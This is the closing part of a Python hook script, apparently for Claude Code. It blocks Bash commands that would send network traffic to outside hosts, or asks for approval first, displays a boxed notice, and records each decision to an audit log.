def print_block_box(command: str, hosts: set[str], ask: bool = False) -> None:
    truncated = truncate_command(command)
    destination = ", ".join(sorted(hosts)) if hosts else "(unresolved)"
    description = "Destination"
    title = "NETWORK EGRESS — APPROVAL REQUIRED" if ask else "NETWORK EGRESS BLOCKED"
    tip = (
        "TIP: Approve once, or allowlist the host for recurring use"
        if ask
        else "TIP: Use /gate to approve, or allowlist the host"
    )

    content_width = max(60, len(truncated) + 4, len(destination) + len(description) + 4)
    top_border = "═" * (content_width + 2)
    print(f"\n╔{top_border}╗", file=sys.stderr)
    print(f"║ {title:^{content_width}} ║", file=sys.stderr)
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ Command: {truncated:<{content_width - 9}} ║", file=sys.stderr)
    print(
        f"║ {description}: {destination:<{content_width - len(description) - 3}} ║",
        file=sys.stderr,
    )
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ {tip:<{content_width}} ║", file=sys.stderr)
    print(f"╚{top_border}╝\n", file=sys.stderr)


def main():
    try:
        if not is_enabled(HOOK_NAME):
            sys.exit(0)

        input_data = json.loads(sys.stdin.read())
        tool_name = input_data.get("tool_name", "")
        tool_input = input_data.get("tool_input", {})

        if tool_name != "Bash":
            sys.exit(0)

        command = tool_input.get("command", "")
        result = check_command(
            command, permission_mode=input_data.get("permission_mode")
        )

        if result:
            result_dict, hosts = result
            ask = is_ask_decision(result_dict)
            print_block_box(command, hosts, ask=ask)
            # Recorded here, not inside check_command: this is the process
            # that emits the exit code, so this is where the decision takes
            # effect. Mirrors block_dangerous.py's piggybacked call site --
            # this one covers the standalone/direct-invocation path, which
            # previously left no audit trail at all despite importing
            # record_decision.
            rule = f"egress -> {', '.join(sorted(hosts)) if hosts else '(destination unresolved)'}"
            if ask:
                # An "ask" carries its reason under hookSpecificOutput, not
                # under "reason".
                record_decision(
                    HOOK_NAME,
                    "ask",
                    result_dict.get("hookSpecificOutput", {}).get(
                        "permissionDecisionReason", ""
                    ),
                    input_data,
                    rule=rule,
                )
            else:
                exit_code = get_exit_code(HOOK_NAME, issue_found=True)
                record_decision(
                    HOOK_NAME,
                    "warn" if exit_code == 1 else result_dict.get("decision", "block"),
                    result_dict.get("reason", ""),
                    input_data,
                    rule=rule,
                )
            print(json.dumps(result_dict))
            # An approval prompt is a normal exit with JSON on stdout; a hard
            # block keeps the exit-2 contract Claude Code treats as a deny.
            sys.exit(0 if ask else get_exit_code(HOOK_NAME, issue_found=True))

        sys.exit(0)

    except json.JSONDecodeError:
        sys.exit(0)
    except RecursionError as e:
        # Fail closed — same backstop and reasoning as block_dangerous.main().
        print(f"Hook error: {e} (blocked: fail closed)", file=sys.stderr)
        print(
            json.dumps(
                {
                    "decision": "block",
                    "reason": "BLOCKED: command analysis exceeded the recursion "
                    "limit; blocked rather than allowed unanalyzed.",
                }
            )
        )
        sys.exit(2)
    except Exception as e:
        # Still non-blocking: check_command already fails closed on analysis
        # errors, so what reaches here is config/audit infrastructure.
        print(f"Hook error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
